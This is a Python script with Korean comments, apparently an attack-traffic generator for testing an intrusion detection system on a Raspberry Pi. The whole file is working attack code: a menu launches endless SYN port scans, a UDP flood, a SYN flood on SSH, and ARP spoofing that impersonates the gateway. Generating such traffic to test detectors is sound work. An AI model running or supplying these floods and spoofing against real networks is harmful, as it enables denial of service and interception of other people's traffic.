import sys
import time
import random
import socket
from scapy.all import IP, TCP, UDP, ARP, Ether, send, sendp, conf, get_if_hwaddr

# ==========================================
# 설정 (Configuration)
# ==========================================
# 공격 대상 (라즈베리 파이의 IP 주소)
TARGET_IP = "192.168.0.XX" 
# 게이트웨이 IP (ARP 스푸핑 테스트용)
GATEWAY_IP = "192.168.0.1"

# 윈도우 환경에서 실행 시 Npcap 사용 설정
if sys.platform == "win32":
    conf.use_pcap = True

# ==========================================
# 1. 포트 스캔 (Port Scan) - Label 1
# ==========================================
def attack_port_scan():
    print(f"\n[1] 포트 스캔 공격 시작 -> {TARGET_IP}")
    print("   (빠른 속도로 다양한 포트에 SYN 패킷을 전송합니다.)")
    
    ports = [21, 22, 23, 80, 443, 3389, 8080, 1883]
    count = 0
    try:
        while True:
            for port in ports:
                # TCP SYN 패킷 생성
                pkt = IP(dst=TARGET_IP)/TCP(dport=port, flags="S")
                send(pkt, verbose=0)
                count += 1
            if count % 100 == 0:
                print(f"   -> {count}개 포트 시도 중...", end="\r")
    except KeyboardInterrupt:
        print(f"\n[!] 포트 스캔 중단. 총 {count}개 패킷 전송됨.")

# ==========================================
# 2. DDoS 공격 (UDP Flood) - Label 2
# ==========================================
def attack_ddos():
    print(f"\n[2] DDoS (UDP Flood) 공격 시작 -> {TARGET_IP}")
    print("   (대량의 대역폭을 점유하기 위해 1KB 데이터를 무한 전송합니다.)")
    
    # 소켓을 사용하여 속도 극대화
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 1024 # 1KB 데이터
    count = 0
    try:
        while True:
            port = random.randint(1, 65535)
            sock.sendto(payload, (TARGET_IP, port))
            count += 1
            if count % 1000 == 0:
                print(f"   -> {count}개 UDP 패킷 전송 중...", end="\r")
    except KeyboardInterrupt:
        print(f"\n[!] DDoS 중단. 총 {count}개 패킷 전송됨.")
        sock.close()

# ==========================================
# 3. 봇넷/브루트포스 (TCP Flood) - Label 3
# ==========================================
def attack_botnet():
    print(f"\n[3] 봇넷 시뮬레이션 (TCP Connect Flood) -> {TARGET_IP}")
    print("   (특정 포트로 지속적인 연결 시도를 수행합니다.)")
    
    count = 0
    try:
        while True:
            # 특정 서비스 포트(예: SSH 22) 집중 공격 시뮬레이션
            pkt = IP(dst=TARGET_IP)/TCP(dport=22, flags="S", seq=random.randint(1000, 9000))
            send(pkt, verbose=0)
            count += 1
            if count % 100 == 0:
                print(f"   -> {count}회 연결 시도 중...", end="\r")
    except KeyboardInterrupt:
        print(f"\n[!] 공격 중단. 총 {count}회 시도됨.")

# ==========================================
# 4. ARP 스푸핑 (ARP Spoofing) - Label 4
# ==========================================
def attack_arp_spoof():
    print(f"\n[4] ARP 스푸핑 공격 시작 -> {TARGET_IP}")
    print("   (타겟의 ARP 테이블을 변조하기 위해 가짜 응답을 지속 전송합니다.)")
    
    # 내 MAC 주소 가져오기
    try:
        my_mac = get_if_hwaddr(conf.iface)
    except:
        print("[Error] 인터페이스를 찾을 수 없습니다.Scapy 설정을 확인하세요.")
        return

    count = 0
    try:
        while True:
            # 타겟에게 "내가 게이트웨이다"라고 속임
            # op=2 (is-at), psrc=게이트웨이IP, hwsrc=내MAC, pdst=타겟IP
            pkt = Ether(src=my_mac)/ARP(op=2, psrc=GATEWAY_IP, hwsrc=my_mac, pdst=TARGET_IP)
            sendp(pkt, verbose=0)
            count += 1
            if count % 50 == 0:
                print(f"   -> {count}개 ARP 패킷 전송 중...", end="\r")
            time.sleep(0.1) # ARP는 너무 빠르면 네트워크가 마비될 수 있어 약간의 간격 유지
    except KeyboardInterrupt:
        print(f"\n[!] ARP 스푸핑 중단. 총 {count}개 패킷 전송됨.")

# ==========================================
# 메인 메뉴
# ==========================================
if __name__ == "__main__":
    if TARGET_IP == "192.168.0.XX":
        print("[!] 경고: TARGET_IP를 라즈베리 파이의 IP로 수정해야 합니다.")
        sys.exit(1)

    while True:
        print("\n" + "="*50)
        print("   🛡️  Edge-IDS 공격 테스트 툴  🛡️")
        print("="*50)
        print(f" 대상 IP: {TARGET_IP}")
        print("-"*50)
        print(" 1. 포트 스캔 (Port Scan)")
        print(" 2. DDoS 공격 (UDP Flood)")
        print(" 3. 봇넷/브루트포스 (TCP Connect)")
        print(" 4. ARP 스푸핑 (ARP Spoofing)")
        print(" q. 종료")
        print("="*50)
        
        choice = input(" 수행할 공격 번호를 선택하세요: ").lower()
        
        if choice == '1':
            attack_port_scan()
        elif choice == '2':
            attack_ddos()
        elif choice == '3':
            attack_botnet()
        elif choice == '4':
            attack_arp_spoof()
        elif choice == 'q':
            print("프로그램을 종료합니다.")
            break
        else:
            print("잘못된 선택입니다.")